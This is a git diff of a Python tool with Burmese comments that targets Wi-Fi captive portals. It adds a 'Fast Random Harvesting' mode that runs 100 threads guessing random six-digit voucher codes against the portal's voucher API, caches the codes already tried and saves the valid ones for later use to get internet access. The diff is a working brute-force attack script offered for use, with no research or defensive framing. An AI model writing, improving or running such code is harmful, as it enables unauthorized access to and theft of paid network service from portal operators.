@@ -5,6 +5,7 @@ import time
 import threading
 import os
 import ssl
+import random
 from urllib.parse import urlparse, parse_qs, urljoin
 
 # --- SSL ERROR FIX ---
@@ -13,11 +14,23 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- CONFIGURATION ---
 SUCCESS_CODES_FILE = "success.txt"
-PING_INTERVAL = 0.5
+TRIED_CODES_FILE = "tried.txt"
+VOUCHER_THREADS = 100 # Threads အရေအတွက် (လိုအပ်လျှင် တိုးနိုင်သည်)
 
 # --- CLEAR SCREEN FUNCTION ---
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
+
+# --- CACHE MANAGEMENT ---
+def load_tried_codes():
+    if not os.path.exists(TRIED_CODES_FILE):
+        return set()
+    with open(TRIED_CODES_FILE, "r") as f:
+        return set(line.strip() for line in f)
+
+def save_tried_code(code):
+    with open(TRIED_CODES_FILE, "a") as f:
+        f.write(f"{code}\n")
 
 # --- PORTAL AUTO DETECT ---
 def get_portal_info():
@@ -70,7 +83,6 @@ def test_specific_code():
     try:
         v_res = session.post(voucher_api, json={'accessCode': code_to_test, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
         
-        # --- တိကျစွာစစ်ဆေးခြင်း (Response text တွင် "success":true ဟု ပါမှ ယူမည်) ---
         if v_res.status_code == 200 and "\"success\":true" in v_res.text:
             print(f"\n\033[92m✅ SUCCESS! Valid Code Found: {code_to_test}\033[0m")
             with open(SUCCESS_CODES_FILE, "a") as f:
@@ -117,10 +129,8 @@ def use_internet_access():
     voucher_api = f"{portal_host}/api/auth/voucher/"
     
     try:
-        # Code အသုံးပြုခြင်း
         v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
         
-        # --- RESPONSE စစ်ဆေးခြင်း ---
         if v_res.status_code == 200 and "\"success\":true" in v_res.text:
             print(f"\n\033[92m✅ SUCCESS! Internet Access Connected.\033[0m")
         else:
@@ -131,6 +141,72 @@ def use_internet_access():
     
     time.sleep(3)
 
+# --- MENU 3: FAST RANDOM HARVESTING ---
+def worker(tried_codes, portal_host, sid, session):
+    while True:
+        code = f"{random.randint(100000, 999999)}"
+        if code in tried_codes:
+            continue
+        
+        tried_codes.add(code)
+        save_tried_code(code)
+        
+        voucher_api = f"{portal_host}/api/auth/voucher/"
+        try:
+            v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=3)
+            if v_res.status_code == 200 and "\"success\":true" in v_res.text:
+                print(f"\n\033[92m✅ SUCCESS! Code Found: {code}\033[0m")
+                with open(SUCCESS_CODES_FILE, "a") as f:
+                    f.write(f"{code}\n")
+            print(f"\r🔍 စမ်းသပ်နေသည်: {code}", end="", flush=True)
+        except:
+            pass
+
+def start_fast_harvesting():
+    print("\n🚀 Fast Random Harvesting စတင်ပြီ...")
+    tried_codes = load_tried_codes()
+    print(f"📚 စမ်းသပ်ပြီးသား Code {len(tried_codes)} ခု ကျော်လွှားမည်။")
+
+    portal_host, portal_url = get_portal_info()
+    if not portal_host:
+        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။")
+        return
+
+    session = requests.Session()
+    sid = get_session_id(session, portal_url)
+    
+    if not sid:
+        print("❌ Session ID ယူမရပါ။")
+        return
+
+    threads = []
+    for _ in range(VOUCHER_THREADS):
+        t = threading.Thread(target=worker, args=(tried_codes, portal_host, sid, session))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    
+    for t in threads:
+        t.join()
+
+# --- MENU 4: VIEW SUCCESS CODES ---
+def view_success_codes():
+    clear_screen()
+    print("========================================")
+    print("         📋 SUCCESS CODES LIST          ")
+    print("========================================")
+    if os.path.exists(SUCCESS_CODES_FILE):
+        with open(SUCCESS_CODES_FILE, "r") as f:
+            codes = f.read()
+            if codes:
+                print(codes)
+            else:
+                print("No success codes found.")
+    else:
+        print("No success codes found.")
+    print("========================================")
+    input("👉 Enter ကိုနှိပ်ပြီး Menu သို့ပြန်သွားပါ။")
+
 # --- MENU SYSTEM ---
 def show_menu():
     clear_screen()
@@ -139,8 +215,10 @@ def show_menu():
     print("========================================")
     print("1. 🔍 Test Specific Code")
     print("2. 🌐 Internet Access (Use Saved Code)")
+    print("3. 🚀 Fast Random Harvesting")
+    print("4. 📋 View Success Codes")
     print("========================================\n")
-    choice = input("👉 ရွေးချယ်ပါ (1-2): ")
+    choice = input("👉 ရွေးချယ်ပါ (1-4): ")
     return choice
 
 if __name__ == "__main__":
@@ -150,6 +228,10 @@ if __name__ == "__main__":
             test_specific_code()
         elif choice == '2':
             use_internet_access()
+        elif choice == '3':
+            start_fast_harvesting()
+        elif choice == '4':
+            view_success_codes()
         else:
             print("🚫 မှားယွင်းသော ရွေးချယ်မှု။")
             time.sleep(1)
